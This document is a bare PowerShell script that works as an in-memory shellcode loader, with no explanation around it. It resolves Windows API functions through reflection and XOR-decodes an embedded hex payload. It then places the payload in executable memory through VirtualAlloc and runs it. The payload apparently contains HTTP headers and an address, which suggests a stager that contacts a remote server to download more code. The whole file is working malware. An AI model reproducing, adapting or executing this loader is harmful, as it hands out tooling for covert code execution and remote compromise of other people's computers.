Set-StrictMode -Version 2

function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

If ([IntPtr]::size -eq 8) {
	[Byte[]]$var_code = [System.Convert]::fromHEXString('df6ba0c7d3cbeb232323627262737172756b12f1466ba871436ba8713b6ba871036ba851736b2c9469696e12ea6b12e38f1f425f210f0362e2ea2e6222e2c1ce7162726ba87103a8611f6b22f345a25b3b28215651a8a3ab2323236ba6e357446b22f373a86b3b67a863036a22f3c0756bdcea62a817ab6b22f56e12ea6b12e38f62e2ea2e6222e21bc356d26f206f072b661af256fb7b67a863076a22f34562a82f6b67a8633f6a22f362a827ab6b22f3627b627b7d7a79627b627a62796ba0cf036271dcc37b627a796ba831ca6cdcdcdc7e49236a9d544a4d4a4d46572362756aaac56faad262996f540524dcf66b12ea6b12f16e12e36e12ea62736273629919755a84dcf6c850796baae2629b732323236e12ea6272627249206272629974aabce5dcf6c87a786baae26b12f16aaafb6e12ea714b232163a771716299c8760d18dcf66baae56ba0e07349297c6baad26baaf96ae4e3dcdcdcdc6e12ea717162990e253b58dcf6a6e32ca6be2223236bdcec2ca7af222323c8f0cac7222323cb81dcdcdc0c674c654c510c5146554a46540c6e404a514c504c455723d3313c93fbaa1e6ee3de6c52bc78960f2d470d78cbd6e4a5b22b08640dcdfe79e732ce188d7a9af30824c5e34ffd64919fefeacc965b752362404046535719034a4e4244460c090f034253534f4a4042574a4c4d0c5b4e4f0f034253534f4a4042574a4c4d0c49504c4d2e296240404653570e6f424d445642444619034e4f2e296240404653570e664d404c474a4d441903090f03404c4e53514650502e29765046510e6244464d5719036e4c594a4f4f420c160d13030b744a4d474c5450036d7703150d121803744a4d151718035b15170a036253534f46744641684a570c1610140d1015030b686b776e6f0f034f4a484603644640484c0a03604b514c4e460c151a0d130d10171a140d1213130370424542514a0c1610140d10152e2923fbdaa071853b2b5f51d602033a4c29c04e0647cf2731632e7b5b5301cc7f7f679aa37881eddbcd8c034e7580d7db1c778468c417d968eb701d770acb893fc1c4cb6c5e06cc373923629dd3968175dcf66b12ea9923236323629b23332323629a6323232362997b8770c6dcf66bb070706baac46baad26baaf9629b230323236aaada629931b5aac1dcf66ba0e703a6e3579545a8246b22e0a6e356f47b7b7b6b263a3e232373e0cbbcdedcdc121a160d1211100d11121a0d12121123347346c9')

	for ($x = 0; $x -lt $var_code.Count; $x++) {
		$var_code[$x] = $var_code[$x] -bxor 35
	}

	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

	$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
	$var_runme.Invoke([IntPtr]::Zero)
}